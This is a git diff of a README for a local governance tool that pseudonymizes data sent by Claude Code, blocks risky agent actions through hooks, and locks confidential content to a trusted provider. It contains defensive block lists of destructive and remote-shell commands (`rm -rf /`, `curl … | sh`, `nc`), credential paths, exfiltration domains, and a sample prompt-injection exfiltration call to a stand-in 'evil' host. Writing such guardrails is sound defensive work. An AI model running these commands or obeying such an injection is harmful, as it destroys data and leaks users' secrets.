@@ -1,344 +1,457 @@
-# Console de gouvernance Claude Code (WSL Ubuntu)
+# AI Governance for Claude Code
 
-Guardrails, pseudonymisation réversible des données sensibles, audit et console de pilotage
-pour Claude Code, le tout sur votre poste, sans service externe.
+**Local-first data protection, guardrails and audit for [Claude Code](https://docs.anthropic.com/en/docs/claude-code).**
+Sensitive data is pseudonymized before it leaves your machine, restored transparently in the model's answers,
+and every agent action is checked against a single, versioned policy. No external service, no cloud dependency.
+
+![Python](https://img.shields.io/badge/python-3.9%2B-3776AB?logo=python&logoColor=white)
+![FastAPI](https://img.shields.io/badge/FastAPI-proxy%20%26%20API-009688?logo=fastapi&logoColor=white)
+![React](https://img.shields.io/badge/React-admin%20console-61DAFB?logo=react&logoColor=black)
+![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker&logoColor=white)
+![Tests](https://img.shields.io/badge/tests-200%20passing-brightgreen)
+
+---
+
+## Table of contents
+
+- [Why](#why)
+- [Key features](#key-features)
+- [Architecture](#architecture)
+- [How pseudonymization works](#how-pseudonymization-works)
+- [What is detected](#what-is-detected)
+- [Guardrails](#guardrails)
+- [Admin console](#admin-console)
+- [Model providers](#model-providers)
+- [Confidentiality levels and the C3 lock](#confidentiality-levels-and-the-c3-lock)
+- [Getting started](#getting-started)
+- [Operations](#operations)
+- [Security model and limitations](#security-model-and-limitations)
+- [Roadmap](#roadmap)
+- [Project layout](#project-layout)
+- [Contributing](#contributing)
+
+---
+
+## Why
+
+Claude Code reads your files, runs commands and sends their output to a remote model. In a consulting or
+enterprise context, that output routinely contains client names, prices, personal data and credentials.
+
+This project puts a **governance layer** between Claude Code and the model provider:
+
+- **Nothing sensitive leaves in clear text.** Prompts, file contents and tool outputs are pseudonymized
+  on the fly; the model only ever sees stable tokens.
+- **Your files stay correct.** Tokens are restored in the model's answers, so Claude Code writes real values
+  to disk, not placeholders.
+- **Risky actions are stopped before they happen.** Deterministic hooks deny or require confirmation for
+  dangerous commands, secret access and exfiltration attempts.
+- **Everything is auditable**, without the audit trail itself becoming a data leak.
+
+## Key features
+
+| | |
+|---|---|
+| 🔒 **Reversible pseudonymization** | Deterministic HMAC tokens, restored in streamed responses (SSE), prompt caching preserved |
+| 🧠 **Hybrid detection** | Regex with validators (IBAN mod 97, Luhn, NIR key) + Presidio NER + client dictionary |
+| 🛡️ **Guardrails** | Pre-prompt and pre-tool hooks: secrets, destructive SQL, dangerous shell, web exfiltration |
+| 🔐 **Confidentiality levels** | C1 / C2 / C3 classification; C3 content can never reach the default cloud provider |
+| 🔀 **Pluggable model providers** | Claude by default, or any "trusted provider" (self-hosted, GPT, Gemini, Mistral, Copilot, Ollama… via LiteLLM) |
+| 🖥️ **Admin console** | React UI to manage clients, projects, files, settings, and simulate what the model receives |
+| 📊 **Observability** | OpenTelemetry → Prometheus / Loki → Grafana: cost, tokens, detections, denials |
+| 🚫 **Fail-closed by design** | If detection or the policy is unavailable, requests are refused rather than sent unprotected |
+
+---
 
 ## Architecture
 
 ```mermaid
 flowchart LR
-  subgraph WSL["WSL Ubuntu"]
+  subgraph HOST["Workstation (Linux / WSL)"]
     direction LR
     CC["Claude Code"]
-    MS[/"/etc/claude-code/managed-settings.json<br/>(permissions, env, hooks verrouillés)"/]
+    MS[/"/etc/claude-code/managed-settings.json<br/>(permissions, env, locked hooks)"/]
     subgraph H["Hooks (/opt/claude-governance)"]
       GP["guard_prompt.py<br/>UserPromptSubmit"]
       GT["guard_tool.py<br/>PreToolUse"]
-      AU["audit.py<br/>Post/Session/Config"]
+      AU["audit.py<br/>Post / Session / Config"]
     end
-    POL[("policy.json<br/>politique unique")]
+    POL[("policy.json<br/>single source of truth")]
     LOG[("/var/log/claude-governance<br/>*.jsonl")]
 
-    subgraph D["Docker Compose (ports liés à 127.0.0.1)"]
-      PX["Proxy de gouvernance<br/>FastAPI :8787"]
-      PR["Presidio Analyzer<br/>NER français"]
-      RD[("Redis<br/>jeton → valeur<br/>mémoire + TTL")]
-      OC["OTel Collector :4317"]
+    subgraph D["Docker Compose (bound to 127.0.0.1)"]
+      PX["Governance proxy<br/>FastAPI :8787"]
+      AD["Admin console<br/>React + FastAPI :8788"]
+      PR["Presidio Analyzer<br/>NER"]
+      RD[("Redis<br/>token → value<br/>in-memory + TTL")]
+      LL["LiteLLM<br/>(optional)"]
+      OC["OTel Collector"]
       PM[("Prometheus")]
       LK[("Loki")]
-      GF["Grafana :3001<br/>Console"]
+      GF["Grafana :3001"]
     end
   end
-  API(("api.anthropic.com"))
+  API(("Anthropic API"))
+  TP(("Trusted provider"))
 
-  MS -.applique.-> CC
+  MS -.enforces.-> CC
   CC -- "1. prompt" --> GP
-  CC -- "2. chaque action" --> GT
-  CC -- "3. après action" --> AU
-  GP & GT & AU -.lit.-> POL
+  CC -- "2. every action" --> GT
+  CC -- "3. after action" --> AU
+  GP & GT & AU -.read.-> POL
   GP & GT & AU -- audit --> LOG
   CC -- "ANTHROPIC_BASE_URL" --> PX
   PX -- NER --> PR
   PX <--> RD
-  PX -- "requête pseudonymisée" --> API
-  API -- "réponse (jetons)" --> PX
-  PX -- "réponse ré-identifiée" --> CC
+  PX -- "pseudonymized request" --> API
+  PX -- "pseudonymized request" --> LL --> TP
+  PX -- "restored response" --> CC
+  AD -- "settings, dictionary" --> PX
   PX -- audit --> LOG
-  PX -.lit.-> POL
-  CC -- "OTLP métriques + événements" --> OC
+  CC -- "OTLP metrics + events" --> OC
   LOG -- filelog --> OC
   OC --> PM & LK
   PX -- /metrics --> PM
   PM & LK --> GF
 ```
 
-### Les trois couches
+### Layers
 
-| Couche | Composant | Rôle | Contournable par l'utilisateur ? |
+| Layer | Component | Responsibility | Can the user bypass it? |
 |---|---|---|---|
-| **Politique** | `managed-settings.json` | Niveau de priorité le plus haut de Claude Code : impose le proxy, la télémétrie, les `deny` sur les fichiers sensibles, désactive `--dangerously-skip-permissions`, n'autorise que les hooks gérés (`allowManagedHooksOnly`) | Non, sauf avec `sudo` (voir limites) |
-| **Guardrails** | hooks `guard_prompt` / `guard_tool` | Décisions déterministes avant chaque prompt et chaque action : `deny`, `ask` (confirmation) ou rien | Non (hooks gérés) |
-| **Anonymisation** | proxy + Presidio + Redis | Tout ce qui part vers l'API (prompts, contenu des fichiers lus, sorties de commandes) est pseudonymisé, puis ré-identifié au retour | Non : `ANTHROPIC_BASE_URL` est imposé par la politique |
-| **Observabilité** | OTel → Prometheus/Loki → Grafana | Console : coûts, tokens, PII détectées, refus, confirmations, journal d'audit | — |
+| **Policy** | `managed-settings.json` | Highest-precedence Claude Code settings: forces the proxy and telemetry, denies sensitive paths, disables `--dangerously-skip-permissions`, allows managed hooks only (`allowManagedHooksOnly`) | No, short of `sudo` (see [limitations](#security-model-and-limitations)) |
+| **Guardrails** | `guard_prompt` / `guard_tool` hooks | Deterministic decision before every prompt and action: `deny`, `ask`, or pass | No (managed hooks) |
+| **Pseudonymization** | Proxy + Presidio + Redis | Everything sent to the model (prompts, file contents, command output) is pseudonymized, then restored on the way back | No: `ANTHROPIC_BASE_URL` is enforced by policy |
+| **Observability** | OTel → Prometheus / Loki → Grafana | Cost, tokens, detected entities, denials, confirmations, audit log | — |
 
-### Pourquoi une pseudonymisation *réversible*
+---
 
-Claude Code n'est pas un chatbot : il **écrit dans vos fichiers**. Si le modèle reçoit
-`PII_EMAIL_3f9a2b1c` et produit un `Edit` avec ce jeton, il faut restituer la vraie valeur
-avant que Claude Code ne l'écrive. Sinon vos fichiers se retrouvent truffés de placeholders.
+## How pseudonymization works
 
-- Jeton = `PII_<TYPE>_<HMAC-SHA256(secret, type|valeur)[:8]>`. Il est **déterministe** : la même valeur
-  donne le même jeton à chaque requête. L'historique reste cohérent et le **prompt caching continue de fonctionner**.
-- La table jeton → valeur ne quitte jamais votre poste. Elle vit dans Redis (en mémoire, sans persistance,
-  avec TTL) et dans un cache du proxy.
-- Streaming SSE : un jeton peut arriver coupé sur plusieurs fragments. Le proxy retient la fin
-  ambiguë du fragment jusqu'au suivant. Dans les `input_json_delta` (arguments d'outils), la valeur
-  restituée est échappée en JSON.
-- Les blocs `thinking` ne sont jamais modifiés, sinon leur signature serait invalidée.
-  Ils ne contiennent de toute façon que des jetons.
-- **Anti-exfiltration** (`pii.rehydration`) : une injection de prompt pourrait faire produire
-  `WebFetch("https://evil/?d=PII_SECRET_…")` pour que le proxy y mette la vraie valeur. Le proxy ne
-  restitue donc **rien** dans `WebFetch`/`WebSearch`, et ne restitue les **secrets** que dans les outils
-  d'écriture de fichiers (`Write`, `Edit`…). Dans `Bash` ou les outils MCP, le jeton `PII_SECRET_…` reste tel quel.
+Claude Code is not a chatbot: it **writes to your files**. If the model receives `PII_EMAIL_3f9a2b1c` and
+emits an `Edit` containing that token, the real value must be restored before the edit is applied;
+otherwise your codebase fills up with placeholders.
 
-### Ce qui est détecté (`policy/policy.json`)
+- **Deterministic tokens** — `PII_<TYPE>_<HMAC-SHA256(secret, type|value)[:8]>`. The same value always yields
+  the same token, so the conversation stays consistent and **prompt caching keeps working**.
+- **Local mapping only** — the token → value table never leaves the machine. It lives in Redis (in-memory,
+  no persistence, TTL) and in a proxy-side cache.
+- **Streaming-safe** — a token may be split across SSE chunks; the proxy holds back the ambiguous tail until
+  the next chunk. Inside `input_json_delta` (tool arguments), restored values are JSON-escaped.
+- **Signed blocks untouched** — `thinking` blocks are never modified (their signature would break); they only
+  contain tokens anyway.
+- **Anti-exfiltration** — a prompt injection could make the model call
+  `WebFetch("https://evil/?d=PII_SECRET_…")` hoping the proxy fills in the real value. Therefore the proxy
+  restores **nothing** in `WebFetch` / `WebSearch`, and restores **secrets** only in file-writing tools
+  (`Write`, `Edit`, …). In `Bash` or MCP tools, `PII_SECRET_…` tokens are left as-is.
 
-| Catégorie | Types | Méthode |
+## What is detected
+
+Configured in [`policy/policy.json`](policy/policy.json).
+
+| Category | Types | Method |
 |---|---|---|
-| Secrets | clés Anthropic, OpenAI, AWS, GitHub, GCP, Slack, JWT, clés privées, mots de passe dans les URL et les affectations | regex |
-| PII françaises | e-mail, téléphone FR, IBAN (contrôle mod 97), NIR (clé de contrôle, Corse comprise), SIRET et carte bancaire (contrôle de Luhn) | regex + validateur |
-| Entités nommées | personnes, lieux | Presidio + spaCy `fr_core_news_lg` |
-| Clients, projets, termes internes | dictionnaire `policy/terms.json` | liste de termes (casse et espaces ignorés) |
-| Montants | `125 000 € HT`, `3 M€`, `TJM 650`, `Prix unitaire : 450,00` | regex (devise, ou mot-clé prix/montant/TJM…) |
+| Secrets | Anthropic, OpenAI, AWS, GitHub, GCP, Slack keys, JWTs, private keys, passwords in URLs and assignments | Regex |
+| Personal data (French formats) | Email, French phone numbers, IBAN (mod 97 check), NIR / social security number (check key, Corsica included), SIRET and payment cards (Luhn) | Regex + validator |
+| Named entities | People, locations | Presidio + spaCy `fr_core_news_lg` |
+| Clients, projects, internal terms | Dictionary (`terms.json`, managed from the console) | Case- and whitespace-insensitive term list |
+| Amounts | `125 000 € HT`, `3 M€`, `TJM 650`, `Prix unitaire : 450,00` | Regex (currency or price keywords) |
 
-Le NER est appliqué aux **prompts saisis** et aux **documents** : sortie de `pdftotext`/`pandoc`, lecture de
-`.md`, `.txt`, `.csv`… Pas au code, où il prend les noms de classes pour des personnes. Pour durcir,
-ajoutez `"tool_result"` à `pii.presidio.scopes`.
+NER is applied to **typed prompts** and **documents** (`pdftotext` / `pandoc` output, `.md`, `.txt`, `.csv` …),
+but not to source code, where class names produce false positives. To harden further, add `"tool_result"`
+to `pii.presidio.scopes`.
 
-**PDF et images** : le proxy ne sait pseudonymiser que du texte. Les blocs PDF et image sont donc retirés
-des requêtes (`pii.request.blocked_media`) et la lecture directe d'un PDF par `Read` est refusée : Claude
-passe par `pdftotext -layout fichier.pdf -`, dont la sortie est pseudonymisée.
+**PDFs and images** cannot be pseudonymized as binary content. They are stripped from requests
+(`pii.request.blocked_media`), and reading a PDF directly with `Read` is denied: Claude is redirected to
+`pdftotext -layout file.pdf -`, whose output is pseudonymized.
 
-### Guardrails (`tool_guard`)
+> The default rules and NER model target French-language content. Other languages are supported by changing
+> the spaCy model and adding patterns in `policy.json`.
 
-| Règle | Exemples | Décision |
+---
+
+## Guardrails
+
+| Rule | Examples | Decision |
 |---|---|---|
-| Fichiers sensibles | `.env*` (sauf `.env.example`), `*.pem`, `~/.ssh`, `~/.aws`, `*.tfstate`, `secrets/` en lecture, écriture, recherche **et via Bash** (`cat .env`) | deny |
-| Commandes dangereuses | `rm -rf /`, `curl … \| sh`, `nc`, `git push --force`, `chmod 777`, `dd of=/dev/…` | deny |
-| SQL destructif | `DROP`, `TRUNCATE`, `GRANT`, `DELETE`/`UPDATE` **sans WHERE**, dans Bash (`psql`, `bq`, `duckdb`…) et dans les outils MCP | deny |
-| Tables à données personnelles | `customers`, `employees`, `patients`… | ask |
-| Actions à impact | `git push`, `terraform apply`, `kubectl apply`, `dbt run --target prod`, `curl`, `sudo` | ask |
-| Exfiltration Bash | commande réseau (`curl`, `wget`, `nc`, `mail`…) contenant un secret / une PII | deny / ask |
-| Secret écrit en dur | `Write` ou `Edit` contenant une clé API | ask |
-| Exfiltration web | `WebFetch` vers pastebin, webhook.site, ngrok…, ou URL contenant une PII | deny |
-| Prompt | secrets, NIR ou carte bancaire collés dans le prompt → **bloqué** ; autres PII → avertissement | block / warn |
+| Sensitive files | `.env*` (except `.env.example`), `*.pem`, `~/.ssh`, `~/.aws`, `*.tfstate`, `secrets/` — read, write, search **and through Bash** (`cat .env`) | deny |
+| Dangerous commands | `rm -rf /`, `curl … \| sh`, `nc`, `git push --force`, `chmod 777`, `dd of=/dev/…` | deny |
+| Destructive SQL | `DROP`, `TRUNCATE`, `GRANT`, `DELETE` / `UPDATE` **without `WHERE`**, in Bash (`psql`, `bq`, `duckdb` …) and MCP tools | deny |
+| Tables holding personal data | `customers`, `employees`, `patients` … | ask |
+| Impactful actions | `git push`, `terraform apply`, `kubectl apply`, `dbt run --target prod`, `curl`, `sudo` | ask |
+| Shell exfiltration | Network command (`curl`, `wget`, `nc`, `mail` …) carrying a secret / personal data | deny / ask |
+| Hard-coded secret | `Write` or `Edit` containing an API key | ask |
+| Web exfiltration | `WebFetch` to pastebin, webhook.site, ngrok …, or a URL containing personal data | deny |
+| Prompt | Secrets, NIR or card numbers pasted into the prompt → **blocked**; other personal data → warning | block / warn |
 
-Toutes les règles sont des regex dans `policy.json`. Les hooks relisent la politique à chaque appel.
-Les règles sur des noms de commandes (`nc`, `curl`, `scp`…) sont ancrées sur la position de commande
-(début, après `;`, `&&`, `|`, `$(`, `sudo`…) : `git commit -m "fix nc"` ne déclenche rien.
-Le contrôle des chemins dans Bash couvre les redirections (`<.env`), les motifs (`cat .en?`, résolus sur
-le disque) et les chemins dans du code inline (`open('.env')`). Il reste contournable par un code
-déterminé (chemin construit dynamiquement) : le proxy est le filet de sécurité.
+All rules are regular expressions in `policy.json`, reloaded on every hook call. Command-name rules are
+anchored to command position (start, after `;`, `&&`, `|`, `$(`, `sudo` …), so `git commit -m "fix nc"` does
+not trigger. Path checks in Bash cover redirections (`<.env`), globs (`cat .en?`, resolved against the disk)
+and inline code (`open('.env')`). A determined program can still build a path dynamically: the proxy is the
+safety net.
 
-## Console d'administration (http://localhost:8788)
+---
 
-Application React (Vite + TypeScript + Tailwind) servie par une API FastAPI, dans le même conteneur.
-Connexion avec le mot de passe `ADMIN_PASSWORD` de `.env` (cookie de session HttpOnly, 12 h).
+## Admin console
 
-| Écran | Usage |
+Available at **http://localhost:8788** — a React (Vite, TypeScript, Tailwind) single-page app served by a
+FastAPI backend in the same container. Sign-in uses `ADMIN_PASSWORD` (HttpOnly session cookie, 12 h).
+
+| Screen | Purpose |
 |---|---|
-| **Tableau de bord** | Santé du proxy et de la détection des noms, taille du dictionnaire, journal des refus, confirmations et pseudonymisations (filtrable). |
-| **Clients** | Déclarer un client (code neutre `C001` + nom + variantes) : masqué immédiatement. Signale les dossiers de `~/clients` sans client déclaré. |
-| **Client › Consultation** | Créer une consultation (`travail/DCE`, `travail/memoire-technique`, `_confidentiel`), déposer les fichiers par glisser-déposer en C2 ou C3, passer un fichier d'un niveau à l'autre, copier la commande `cd … && claude`. |
-| **Projets** | Déclarer un dépôt de code de `~/project` (monté en lecture seule), l'associer à un client ou « interne », parcourir son arborescence et passer un fichier ou un dossier en C3 **sans le déplacer ni le renommer**, analyser le projet (termes du dictionnaire, fichiers de secrets, identifiants en dur, nom sensible dans le chemin), copier la commande `cd … && claude`. |
-| **Simulateur** | Coller un texte : voir exactement ce que reçoit le modèle, jetons surlignés par type. |
-| **Réglages** | Modèle d'IA (Claude / fournisseur de confiance). Données masquées : montants, e-mails, téléphones, IBAN, cartes, NIR, SIRET, adresses IP, images. Détection des noms (documents, sorties d'outils, seuil). Exceptions (termes jamais masqués ; un terme du dictionnaire est refusé). Actions sensibles : demander ou refuser (envoi réseau de données personnelles, SQL sur les tables listées, secret écrit en dur). Domaines web interdits (ajouts à la liste de base). Historique des modifications (aussi dans le tableau de bord, « protection réduite » signalée) et retour aux valeurs de `policy.json`. Non réglables par sécurité : secrets, fichiers sensibles, verrou C3, commandes interdites, fail-closed. |
+| **Dashboard** | Proxy and NER health, dictionary size, active model provider, filterable log of denials, confirmations and pseudonymizations |
+| **Clients** | Declare a client (neutral code such as `C001`, name, variants) — masked immediately. Flags folders without a declared client |
+| **Client › Engagement** | Create an engagement folder, drag-and-drop files as C2 or C3, move files between levels, copy the `cd … && claude` command |
+| **Projects** | Register a code repository (mounted read-only), link it to a client, browse its tree and mark files or folders as C3 **in place** (no move, no rename), scan for dictionary terms, secret files, hard-coded credentials and sensitive path names |
+| **Simulator** | Paste text and see exactly what the model receives, with tokens highlighted by type |
+| **Settings** | Model provider; masked data types; NER scope and threshold; allowlist; ask/deny decisions for sensitive actions; personal-data tables; extra blocked web domains; change history (reduced protection is flagged) and reset to `policy.json` defaults. Secrets, sensitive paths, the C3 lock, forbidden commands and fail-closed are **deliberately not configurable** |
 
-Développement de l'interface : `cd admin/web && npm install && npm run dev` (API attendue sur :8788).
+Changes apply **within seconds, without restart**: the proxy watches `~/.config/claude-governance/`
+(`terms.json`, `overrides.json`) and hooks re-read it on every call. Claude itself has no access to this folder.
 
-Les modifications sont prises en compte **en quelques secondes**, sans redémarrage : le proxy surveille
-`~/.config/claude-governance/` (dictionnaire `terms.json`, réglages `overrides.json`) et les hooks le
-relisent à chaque appel. Claude n'a aucun accès à ce dossier (lecture, écriture et Bash refusés).
+Front-end development: `cd admin/web && npm install && npm run dev` (expects the API on `:8788`).
 
-## Modèle d'IA : Claude ou fournisseur de confiance
+---
 
-Interrupteur global dans la console (**Réglages › Modèle d'IA**), appliqué en quelques secondes :
+## Model providers
 
-| Fournisseur | Routage des requêtes de modèle (`/v1/messages`) | Authentification |
+A global switch in the console (**Settings › AI model**) selects where model requests (`/v1/messages`) are routed.
+
+| Provider | Routing | Authentication |
 |---|---|---|
-| **Claude** (défaut) | `https://api.anthropic.com` | abonnement de l'utilisateur, en-têtes relayés |
-| **Fournisseur de confiance** | `TRUSTED_URL`, modèle `TRUSTED_MODEL` | `TRUSTED_API_KEY` du `.env` ; le jeton Claude n'est **jamais** transmis |
+| **Claude** (default) | `https://api.anthropic.com` | The user's own subscription; headers relayed unchanged |
+| **Trusted provider** | `TRUSTED_URL`, model forced to `TRUSTED_MODEL` | `TRUSTED_API_KEY`; Claude credentials are **never** forwarded |
 
-Le fournisseur de confiance est le seul autorisé à lire le contenu C3. Il doit exposer l'API
-**Anthropic Messages** (`/v1/messages`). Variables du `.env` :
+The trusted provider is the **only** provider allowed to read C3 content. It must expose the
+**Anthropic Messages API**. Configuration (environment file):
 
-| Variable | Rôle |
+| Variable | Description |
 |---|---|
-| `TRUSTED_URL` | URL de base, sans `/v1` (ex. `http://litellm:4000`, `https://llm.mon-entreprise.fr`) |
-| `TRUSTED_MODEL` | modèle imposé à toutes les requêtes |
-| `TRUSTED_API_KEY` | clé du fournisseur |
-| `TRUSTED_NAME` | nom affiché dans la console et la ligne d'état (défaut : « Fournisseur de confiance ») |
-| `TRUSTED_AUTH` | `x-api-key` (défaut) ou `bearer` (`Authorization: Bearer …`) |
+| `TRUSTED_URL` | Base URL, without `/v1` (e.g. `http://litellm:4000`, `https://llm.example.com`) |
+| `TRUSTED_MODEL` | Model enforced on every request |
+| `TRUSTED_API_KEY` | Provider API key |
+| `TRUSTED_NAME` | Display name in the console and status line (default: *Fournisseur de confiance*) |
+| `TRUSTED_AUTH` | `x-api-key` (default) or `bearer` (`Authorization: Bearer …`) |
 
-### Brancher GPT, Gemini, Mistral, Copilot, Ollama… avec LiteLLM
+### Connecting GPT, Gemini, Mistral, Copilot, Ollama… through LiteLLM
 
-Pour un fournisseur qui ne parle pas le format Anthropic, activez la passerelle
-[LiteLLM](https://github.com/BerriAI/litellm) fournie en option : elle traduit vers OpenAI, Gemini, Mistral,
-Azure OpenAI, GitHub Copilot, Ollama, vLLM, etc.
+For providers that do not speak the Anthropic format, an optional [LiteLLM](https://github.com/BerriAI/litellm)
+gateway is included. It translates to OpenAI, Gemini, Mistral, Azure OpenAI, GitHub Copilot, Ollama, vLLM and more.
 
 ```bash
-cp litellm/config.example.yaml litellm/config.yaml   # garder le ou les modèles voulus
-# dans .env :
-#   LITELLM_MASTER_KEY=<une clé longue au hasard>
-#   OPENAI_API_KEY=...            (ou GEMINI_API_KEY, MISTRAL_API_KEY...)
+cp litellm/config.example.yaml litellm/config.yaml   # keep the model(s) you need
+
+# In your environment file:
+#   LITELLM_MASTER_KEY=<long random string>
+#   OPENAI_API_KEY=...             # or GEMINI_API_KEY, MISTRAL_API_KEY, ...
 #   TRUSTED_URL=http://litellm:4000
-#   TRUSTED_MODEL=gpt             (le model_name de litellm/config.yaml)
-#   TRUSTED_API_KEY=<même valeur que LITELLM_MASTER_KEY>
+#   TRUSTED_MODEL=gpt              # a model_name from litellm/config.yaml
+#   TRUSTED_API_KEY=<same value as LITELLM_MASTER_KEY>
 #   TRUSTED_NAME=GPT (OpenAI)
+
 docker compose --profile litellm up -d
 docker compose up -d --force-recreate proxy admin
 ```
 
-> ⚠️ Le contenu C3 est envoyé (pseudonymisé) au fournisseur de confiance. Ne choisissez comme fournisseur
-> de confiance qu'un service à qui vous confiez réellement ces données : un modèle local (Ollama, vLLM) ou
-> hébergé par votre organisation, ou un fournisseur couvert par votre contrat.
+> [!WARNING]
+> C3 content is sent (pseudonymized) to the trusted provider. Only designate a service you genuinely trust
+> with that data: a local model (Ollama, vLLM), one hosted by your organization, or a provider covered by
+> your contract.
 
-### Comportement
+### Behavior
 
-- La pseudonymisation et les guardrails s'appliquent dans les deux cas : une session peut changer de
-  fournisseur sans qu'aucune donnée en clair n'atteigne Anthropic.
-- En mode fournisseur de confiance, le proxy ne garde que les événements SSE standard (certains serveurs
-  compatibles ajoutent des copies non ré-identifiables) et répond lui-même à `count_tokens` (estimation).
-- Après une bascule, ouvrez une **nouvelle session** (ou `/clear`) : les blocs de raisonnement d'un
-  modèle ne sont pas valides pour l'autre.
-- Selon le modèle choisi, le fournisseur de confiance peut être moins fiable que Claude sur le code et les
-  tâches longues, avec un contexte plus court (Claude Code peut tarder à compacter la conversation).
+- Pseudonymization and guardrails apply to **both** providers: a session can switch providers without any
+  clear-text data reaching Anthropic.
+- With the trusted provider, the proxy keeps only standard SSE events (some compatible servers emit
+  non-restorable duplicates) and answers `count_tokens` locally with an estimate.
+- After switching, start a **new session** (or `/clear`): one model's reasoning blocks are not valid for another.
+- Depending on the model, the trusted provider may be less reliable than Claude on code and long tasks, with
+  a shorter context window.
 
-### Verrou C3 (fournisseur de confiance uniquement)
+---
 
-Trois verrous indépendants garantissent qu'un contenu C3 n'atteint jamais Anthropic :
+## Confidentiality levels and the C3 lock
 
-1. **Hooks** : tout accès C3 (Read, Grep, Glob, Bash, MCP — détecté par `tool_guard.c3_marker_regex`)
-   est refusé si Claude est le fournisseur actif. Avec le fournisseur de confiance, il est autorisé et la session est inscrite
-   dans `~/.config/claude-governance/c3-sessions.json` (fermée au `SessionEnd`).
-2. **Console** : retour à Claude refusé tant qu'une session C3 est ouverte (clôture manuelle possible
-   si Claude Code a été fermé brutalement ; inactive depuis 12 h = fermée).
-3. **Proxy**, en mode Claude : refuse (403) toute requête d'une session inscrite C3 — même terminée ou
-   reprise des jours plus tard (`x-claude-code-session-id`) —, toute requête dont l'historique contient
-   un accès C3, et toutes les requêtes si le registre est illisible (fail-closed).
+Content is classified by where it is stored:
 
-### Chemins C3 déclarés (projets de code)
-
-Dans un dépôt de code, renommer un fichier pour le marquer C3 casserait les références du code. L'écran
-**Projets** permet de déclarer des chemins C3 en place. La console écrit `c3-paths.json` (chemins absolus
-côté hôte) dans `~/.config/claude-governance`, relu à chaud par les hooks et le proxy, en plus du marqueur
-de `policy.json` :
-
-- **Hooks** : tout chemin visé par Read/Edit/Write, Grep, Glob, Bash (y compris un mot sans `/`, un motif
-  `*`, ou un chemin relatif après `cd`) est résolu depuis le répertoire de travail et comparé aux chemins
-  déclarés. Une **recherche récursive** (Grep sur un dossier, `grep -r`, `rg`, `find`, `tar`, `git grep`…)
-  sur un **dossier parent** d'un chemin C3, ou d'un dossier portant le marqueur C3, est traitée comme un
-  accès C3. Si le dossier est trop gros pour le vérifier (plus de 20 000 entrées ou 0,6 s), elle est
-  refusée avec Claude : ciblez un sous-dossier.
-- **Proxy** : refuse toute requête dont l'historique contient un chemin absolu déclaré C3. Il ne connaît
-  pas le répertoire de travail : les chemins relatifs sont couverts par les hooks et le registre des
-  sessions C3.
-- `c3-paths.json` illisible : les hooks refusent toute action (fail-closed) ; le proxy garde la
-  configuration précédente.
-- Limite : un programme qui parcourt lui-même le disque (script Python, test, build) n'est pas
-  analysé. Ne lancez pas avec Claude un outil qui lit le contenu des chemins C3.
-
-## Usage appels d'offres et projets clients
-
-Trois niveaux de confidentialité, appliqués par convention de rangement :
-
-| Niveau | Exemples | Traitement | Comment |
+| Level | Examples | Handling | How to apply |
 |---|---|---|---|
-| **C3 — jamais chez Anthropic** | offre de prix, pièces sous NDA, contenu technique stratégique | illisible avec Claude ; lisible **uniquement avec le fournisseur de confiance**, session alors verrouillée | ranger dans un dossier `_confidentiel/` ou nommer `*.confidentiel.*` |
-| **C2 — pseudonymisé** | DCE, CCTP, mémoire technique, CV | clients, projets, montants, personnes, contacts remplacés par des jetons | `policy/terms.json` + règles par défaut |
-| **C1 — libre** | code, documentation publique | secrets et PII remplacés par des jetons | règles par défaut |
+| **C3 — never sent to Anthropic** | Pricing, NDA material, strategic technical content | Unreadable with Claude; readable **only with the trusted provider**, and the session is then locked | Store under a `_confidentiel/` folder, name files `*.confidentiel.*`, or declare paths in the **Projects** screen |
+| **C2 — pseudonymized** | Tender documents, specifications, technical proposals, résumés | Clients, projects, amounts, people and contact details replaced by tokens | Dictionary + default rules |
+| **C1 — open** | Source code, public documentation | Secrets and personal data replaced by tokens | Default rules |
 
-**Dictionnaire des clients.** Géré par la console (écran Clients). Listez toutes les variantes d'un nom
-(accents, sigles, ancien nom, filiales) : c'est la protection la plus fiable pour les noms, le NER ne
-détectant pas les organisations. Utilisez un code neutre (`C001`) pour les dossiers : les chemins sont
-envoyés au modèle.
+### Three independent locks
 
-**Ce qui part malgré tout chez Anthropic** : le fond des documents C2 (exigences, approche technique,
-structure de l'offre), avec des jetons à la place des identifiants. Le modèle ne voit plus les montants :
-il ne peut plus calculer un total ni vérifier la cohérence d'un BPU/DQE. Mettez `enabled: false` sur les
-motifs `MONTANT` si vous en avez besoin pour une tâche donnée.
+1. **Hooks** — any C3 access (Read, Grep, Glob, Bash, MCP; detected via `tool_guard.c3_marker_regex` or declared
+   paths) is denied while Claude is active. With the trusted provider it is allowed, and the session is recorded
+   in `c3-sessions.json` (closed on `SessionEnd`).
+2. **Console** — switching back to Claude is refused while a C3 session is open (manual closing is available if
+   Claude Code was killed; sessions idle for 12 h are considered closed).
+3. **Proxy** — in Claude mode, rejects any request from a recorded C3 session (even resumed days later, via
+   `x-claude-code-session-id`), any request whose history contains a C3 access, and all requests if the registry is
+   unreadable (fail-closed).
 
-**Abonnement Pro.** Testé : l'authentification Pro passe bien par le proxy. Vérifiez sur claude.ai, dans
-les paramètres de confidentialité, que l'utilisation de vos conversations pour l'entraînement est
-désactivée. Pour des données clients sous contrat, un plan Team/Enterprise ou une clé API (conditions
-commerciales) offre un cadre contractuel plus adapté que les conditions grand public.
+### Declared C3 paths in code repositories
 
-## Installation
+Renaming a file to mark it C3 would break code references, so the **Projects** screen lets you declare C3
+paths in place. The console writes `c3-paths.json`, hot-reloaded by hooks and proxy:
 
-Prérequis : WSL2 Ubuntu 22.04 ou 24.04, Python ≥ 3.9, Docker (Docker Desktop avec intégration WSL,
-ou `docker-ce` installé dans WSL), Claude Code, `sudo`.
+- **Hooks** resolve every path targeted by Read/Edit/Write, Grep, Glob or Bash (including bare words, globs and
+  relative paths after `cd`) against declared paths. A **recursive search** (`grep -r`, `rg`, `find`, `tar`,
+  `git grep` …) over a **parent** of a C3 path is treated as C3 access. If the tree is too large to verify
+  (over 20,000 entries or 0.6 s), it is denied with Claude: target a subfolder instead.
+- **Proxy** rejects any request whose history contains an absolute declared C3 path.
+- If `c3-paths.json` is unreadable, hooks deny every action (fail-closed) and the proxy keeps its previous configuration.
+- *Limitation:* a program that walks the disk on its own (script, test runner, build) is not inspected. Do not
+  run tools that read C3 content while Claude is active.
+
+### What still reaches the provider
+
+The substance of C2 documents (requirements, technical approach, structure) is sent, with identifiers replaced
+by tokens. Because amounts are masked, the model cannot compute totals or check pricing consistency; disable the
+amount patterns for a specific task if needed.
+
